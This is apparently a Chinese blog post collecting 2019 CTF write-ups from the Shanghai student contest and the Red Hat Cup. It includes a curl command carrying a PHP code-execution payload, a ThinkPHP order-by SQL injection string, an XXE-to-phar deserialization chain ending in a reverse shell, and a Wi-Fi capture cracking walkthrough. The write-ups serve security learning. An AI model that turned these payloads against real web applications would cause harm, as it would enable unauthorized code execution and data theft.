---
title: 2019WriteUp 汇总 VOL 3
summary: 2019上海大学生网络安全邀请赛 && 2019红帽杯
featured-img: 2019-wp-vol3
layout: post
---

+ [2019上海大学生网络安全邀请赛](#2019上海大学生网络安全邀请赛)
+ [2019红帽杯](2019红帽杯)

## 2019上海大学生网络安全邀请赛

### PHP

byteCTF boring_code++

```
curl "http://9f541345e3134764922236b093730b44cf8166f9f5cf4994.changame.ichunqiu.com/code/?code=echo(serialize(file(end(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion()))))))))))))))));"
```

***

## 2019红帽杯

### ticker_system

上传xml文件 + XXE

构造tp5.2的反序列化pop链，xxe `SYSTEM "phar://"`触发

服务器perl反弹shell后执行`/flag` ，trap bypass交互式验证码即可

***

### easyweb

tp3.2.3 order by报错注入

无报错回显，但可列目录

```
orderby[updatexml(1,concat(0x25,(select/**/flaag/**/from/**/fl4g)),1)%23]=1
```

`/App/Runtime/Logs/Api/19_11_11.log`看回显

***

### 恶臭流量包

802.11流量包，aircrack-ng爆破，密钥为12345678

通过wireshark导入密钥解密流量，搜索HTTP流量，发现一个上传图片。图片中藏了一个加密的压缩包

上传请求的Cookie jwt解密后为`hint：for security, I set my password as a website which i just pinged before`，wireshark搜索发现没有icmp包。可以推断域名解析的ip为127.0.0.1，发现一个dnslog.cn的域名，就是压缩包密码

p.s. 没有icmp包是因为走的网卡和访问公网的不同，猜测是loopback；且Windows上wireshark默认不装winpcap是无法抓取loopback流量的